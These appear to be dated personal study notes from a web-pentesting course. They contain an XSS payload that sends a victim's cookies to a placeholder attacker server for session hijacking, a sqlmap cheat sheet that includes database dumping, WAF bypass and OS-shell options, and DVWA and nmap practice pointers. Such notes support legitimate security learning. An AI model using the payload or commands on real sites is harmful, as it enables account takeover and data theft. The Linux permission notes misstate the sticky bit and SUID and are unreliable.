# JAN
## 14
### Additional Flags to Prevent Cookie Manipulation
- httpOnly flag
- secure flag

### document.location
- Also window.location - represents the URL of the webpage

### Cookie Stealing Using A Web Server
```javascript
<script>document.location='http://your ip/cookiestealer.php?c='+document.cookie;</script>
```

**Motivation:** Uploading a malicious JS script so that an admin views it and his cookies are sent to my server so that I can hijack his session. <br>
**Note:** All session tokens are cookies but no all cookies are session tokens.

## 15
https://www.stationx.net/sqlmap-cheat-sheet/
### SQLMAP
- 6 Techniques
- `--crawl 3` : Depth -> 3
- `--batch` : Default
- `--technique="U"` : Union Attack
- `--threads` : Saves time
- `--risk 1/2/3`
- `--level 1/2/3/4/5` : Increases range of vulnerabilites/Increases false positive
- `-V 1/2/3/4/5`
- ![image](https://github.com/PranjalBasak/Documentation/assets/66166653/9b1f8674-9aa1-44b7-9c7f-ca4a83f87839)

- `--current-user`
- `--current-db`
- `--hostname`
- `--dbs` : Show all Database details
- `-D <database_name> --tables` : Show tables
- `-T <table_name> --dump` : Show data of `<table_name>`
- `-D <db> -T <table> --columns` : Show all the columns of `<table>`
- `-D <db> --dump-all` : Dump all the data of database `<db>`
- `--output-dir=<url>`
- `--headers="Referer:abc.com" -v 4 --batch`
- `--user-agent="GECKO_Chrome" -v 4 --batch`
- `--mobile -v 4 --batch` : Pretending to be a mobile user agent
- `--list-tampers` : Lists WAF Bypass Techniques
- `--tamper=base64encode -v 3 --batch`
- `--forms`: Sends data to a form
- `--data="uname=abc&pass=abc&login=submit" --dbs`
- `--proxy="127.0.0.1:4444"` : Can use burpsuite
- `-r abc --batch`
-  `--cookie`
-  `--flush-session` : Clears SQLi sessions so that we can use new payloads
-  `--comment` : Brings hidden comments
-  `--os-shell` : Brings command shell
-  `--os-cmd`

## 16 Jan

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

```bash
python3 /bin/sqlmap/sqlmap.py
```

Resources to Learn and Practice
https://nmap.org/book/man.html
https://nmap.org/docs.html
https://hackertarget.com/nmap-cheatsheet-a-quick.../
https://hackertarget.com/nmap-tutorial/
https://www.stationx.net/nmap-cheat-sheet/
https://media.x-ra.de/doc/NmapCheatSheetv1.1.pdf
https://www.100security.com.br/netdiscover
https://kalilinuxtutorials.com/netdiscover-scan-live.../
https://www.youtube.com/watch?v=PS677owUk-c
https://www.stationx.net/nmap-cheat-sheet/
https://redteamtutorials.com/2018/10/14/nmap-cheatsheet/
https://resources.infosecinstitute.com/nmap-cheat-sheet/...
https://medium.com/.../nmap-cheat-sheet-nmap-scanning...
[https://resources.infosecinstitute.com/network.../...
](https://resources.infosecinstitute.com/network-discovery-tool/?fbclid=IwAR0SzhZwp6lbIuxRzjcyxREzOcdN5J1wyvCu4RpnkBEYZPKogLl9YDmb3wQ#gref)https://resources.infosecinstitute.com/network-discovery-tool/?fbclid=IwAR0SzhZwp6lbIuxRzjcyxREzOcdN5J1wyvCu4RpnkBEYZPKogLl9YDmb3wQ#gref
0x207c20


## 17 Jan
`chmod 1777`
- 1 : Sticky Bit -> Allows the deletion of a file within a directory
- 2 : SGID -> Set GID Bit -> Gives the files within the directory the group owner of the directory rather than the group owner of the file
- 3 : SUID -> Set UID Bit -> Used for Scripts to allow them to use sudo privileges
### Useful Commands
- `umask 0777` : Remove all of rwx permission from ugo
- `chgrp <group> <file/dir>` : Change the group of a file or directory
- `touch dir/{1,2,3}`
- `dpkg -l`
- `dpkg -s <pkg_name>`
- `apt-cache search <description of the pkg>` : Look for a package to install

